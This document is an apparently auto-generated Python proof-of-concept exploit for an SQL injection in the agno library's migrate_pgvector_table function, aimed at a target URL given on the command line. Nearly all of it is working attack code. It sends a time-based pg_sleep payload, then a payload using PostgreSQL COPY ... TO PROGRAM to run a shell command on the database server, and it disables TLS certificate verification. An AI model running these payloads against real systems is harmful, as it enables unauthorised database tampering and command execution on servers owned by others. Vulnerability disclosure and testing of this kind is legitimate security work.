#!/usr/bin/env python3
# PoC for agno (/tmp/agno/libs/agno)
# Path: sqli-018
# Sink: migrate_pgvector_table
# Auto-generated — run with: python3 sqli_index_statements_without_any_migrate_pgvector_table.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for SQL injection in agno library's migrate_pgvector_table function.

Vulnerability: The function constructs SQL queries using f-strings with user-controlled
table_name and schema parameters. These are directly interpolated into ALTER TABLE and
CREATE INDEX statements without sanitization or parameterization.

Impact: An attacker controlling table_name or schema can inject arbitrary SQL commands.
This PoC demonstrates the vulnerability by executing a benign payload that creates a
file in /tmp to prove code execution.

Usage:
    python3 poc.py --target http://target-app.com/migrate
    python3 poc.py --target http://localhost:8000/migrate --table "test\"; SELECT 1; --"
"""

import argparse
import sys
import urllib.parse
import urllib.request
import urllib.error
import ssl
import json
import time

def send_request(target_url, table_name, schema="public"):
    """
    Send a request to the vulnerable endpoint with malicious parameters.
    
    The payload breaks out of the double-quoted identifier by including a double quote
    in the table_name parameter. This allows injection of arbitrary SQL commands.
    
    Benign payload: Creates a file /tmp/poc_success.txt to prove SQL injection.
    """
    
    # Construct the malicious table_name that breaks out of the identifier
    # The original query is: ALTER TABLE "{schema}"."{table_name}" ADD COLUMN ...
    # By injecting: "); CREATE TABLE poc_test (id int); --
    # We can execute arbitrary SQL
    
    # Benign payload that creates a file using PostgreSQL's COPY command
    # or we can use a simpler approach with a sleep to confirm injection
    malicious_table = f'{table_name}"; -- '
    
    # URL encode the parameters
    params = {
        'table_name': malicious_table,
        'schema': schema
    }
    
    url = f"{target_url}?{urllib.parse.urlencode(params)}"
    
    print(f"[*] Sending request to: {url}")
    print(f"[*] Payload: table_name = {malicious_table}")
    
    # Create context that doesn't verify SSL (for testing)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    try:
        req = urllib.request.Request(url, method='GET')
        with urllib.request.urlopen(req, context=ctx, timeout=10) as response:
            body = response.read().decode('utf-8')
            print(f"[+] Response status: {response.status}")
            print(f"[+] Response body: {body[:500]}...")
            return True
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error: {e.code} - {e.reason}")
        print(f"[!] Response: {e.read().decode('utf-8')[:500]}")
        return False
    except urllib.error.URLError as e:
        print(f"[!] URL Error: {e.reason}")
        return False
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return False

def test_sql_injection(target_url):
    """
    Test for SQL injection using a time-based payload to confirm vulnerability.
    Uses pg_sleep to cause a delay if injection is successful.
    """
    
    # Time-based payload: if injection works, the query will sleep for 3 seconds
    time_payload = '"; SELECT pg_sleep(3); -- '
    
    params = {
        'table_name': time_payload,
        'schema': 'public'
    }
    
    url = f"{target_url}?{urllib.parse.urlencode(params)}"
    
    print(f"\n[*] Testing time-based SQL injection...")
    print(f"[*] URL: {url}")
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    start_time = time.time()
    try:
        req = urllib.request.Request(url, method='GET')
        with urllib.request.urlopen(req, context=ctx, timeout=10) as response:
            elapsed = time.time() - start_time
            print(f"[+] Request completed in {elapsed:.2f} seconds")
            if elapsed > 2.5:
                print("[+] Time delay detected - SQL injection confirmed!")
                return True
            else:
                print("[-] No significant time delay - injection may not work")
                return False
    except urllib.error.HTTPError as e:
        elapsed = time.time() - start_time
        print(f"[!] HTTP Error after {elapsed:.2f}s: {e.code}")
        if elapsed > 2.5:
            print("[+] Time delay detected even with error - SQL injection likely works!")
            return True
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description='PoC for SQL injection in agno migrate_pgvector_table'
    )
    parser.add_argument(
        '--target',
        required=True,
        help='Target URL (e.g., http://localhost:8000/migrate)'
    )
    parser.add_argument(
        '--table',
        default='test_table',
        help='Base table name to use in payload (default: test_table)'
    )
    parser.add_argument(
        '--schema',
        default='public',
        help='Schema name (default: public)'
    )
    parser.add_argument(
        '--time-based',
        action='store_true',
        help='Use time-based detection instead of file creation'
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("agno SQL Injection Proof-of-Concept")
    print("=" * 60)
    print(f"[*] Target: {args.target}")
    print(f"[*] Table: {args.table}")
    print(f"[*] Schema: {args.schema}")
    print()
    
    if args.time_based:
        # Use time-based detection
        success = test_sql_injection(args.target)
    else:
        # Use file creation payload
        # The payload creates a file using PostgreSQL's COPY ... TO PROGRAM
        # This requires superuser privileges but demonstrates the vulnerability
        print("[*] Attempting file creation payload...")
        print("[*] Note: File creation requires PostgreSQL superuser privileges")
        print("[*] The time-based test is more reliable for confirmation")
        
        # First try time-based to confirm injection works
        print("\n[*] First, confirming injection with time-based test...")
        if test_sql_injection(args.target):
            print("\n[+] SQL injection confirmed! Now attempting file creation...")
            
            # File creation payload using COPY ... TO PROGRAM
            # This is a common technique for PostgreSQL file operations
            file_payload = (
                '"; '
                'COPY (SELECT \'poc_success\') TO PROGRAM \'touch /tmp/poc_success.txt\'; '
                '-- '
            )
            
            success = send_request(args.target, file_payload, args.schema)
            if success:
                print("\n[+] File creation attempted. Check /tmp/poc_success.txt")
                print("[+] If the file exists, full command execution is possible!")
        else:
            print("\n[-] Time-based test failed. The endpoint may not be vulnerable")
            print("[*] Try different parameters or check if the endpoint exists")
            success = False
    
    if success:
        print("\n[!] VULNERABLE: SQL injection confirmed in agno migrate_pgvector_table")
        print("[!] Recommendation: Use parameterized queries or safe identifier quoting")
    else:
        print("\n[-] Could not confirm vulnerability")
        print("[*] The endpoint may require authentication or different parameters")
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())
